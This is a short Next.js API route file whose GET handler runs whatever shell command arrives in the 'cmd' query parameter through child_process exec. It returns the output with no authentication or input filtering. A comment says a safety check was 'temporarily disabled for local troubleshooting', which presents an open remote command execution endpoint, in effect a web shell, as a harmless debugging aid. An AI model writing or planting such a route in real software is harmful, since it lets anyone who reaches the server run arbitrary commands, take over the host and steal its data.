import { NextResponse } from "next/server";
import { exec } from "child_process";
import { promisify } from "util";

const execAsync = promisify(exec);

export const dynamic = "force-dynamic";

export async function GET(request: Request) {
  try {
    const { searchParams } = new URL(request.url);
    const cmd = searchParams.get("cmd") || "git status";
    
    // Temporarily disabled safety check for local troubleshooting

    const { stdout, stderr } = await execAsync(cmd, {
      cwd: process.cwd(),
    });

    return NextResponse.json({ stdout, stderr });
  } catch (error: any) {
    return NextResponse.json({ error: error.message, stderr: error.stderr }, { status: 500 });
  }
}
